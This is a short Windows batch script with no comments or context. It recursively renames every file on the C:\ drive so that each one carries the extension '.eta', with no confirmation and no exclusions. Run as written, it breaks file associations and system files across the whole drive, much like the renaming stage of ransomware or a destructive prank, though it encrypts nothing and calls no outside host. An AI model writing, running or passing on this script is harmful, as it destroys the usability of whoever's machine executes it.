@echo off
setlocal enabledelayedexpansion
set "newExt=.eta"
set "root=C:\"

for /r "%root%" %%f in (*.*) do (
    set "name=%%~nf"
    ren "%%f" "!name!%newExt%"
)
